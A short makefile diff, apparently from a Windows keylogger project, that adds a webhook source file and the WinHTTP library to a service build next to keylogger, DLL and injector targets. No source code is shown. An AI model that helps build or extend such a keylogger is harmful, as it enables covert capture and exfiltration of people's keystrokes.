@@ -11,8 +11,8 @@ $(RES_FILE): $(RC_FILE)
 winkey.exe: $(SRCS) keylog\exemain.c
 	cl $(FLAGS) /Fe$@ $** $(RES_FILE) user32.lib psapi.lib
 
-svc.exe: service\svc.cpp
-	$(CC) $(FLAGS) -I keylog /Fe$@ $** user32.lib advapi32.lib wtsapi32.lib
+svc.exe: service\svc.cpp service\webhook.cpp
+	cl $(FLAGS) /EHsc -I keylog /Fe$@ $** user32.lib advapi32.lib wtsapi32.lib winhttp.lib
 
 bonus: keylogger.dll injector.exe
 
